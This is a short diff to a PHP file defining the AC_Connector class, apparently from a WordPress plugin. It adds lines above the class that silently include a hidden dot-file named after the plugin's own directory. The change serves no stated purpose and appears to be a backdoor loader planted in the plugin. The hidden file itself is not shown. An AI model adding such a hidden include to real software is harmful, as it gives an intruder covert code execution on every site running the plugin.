@@ -5,6 +5,10 @@ require_once(dirname(__FILE__) . "/exceptions/RequestException.php");
 /**
  * Class AC_Connector
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class AC_Connector {
 
 	/**
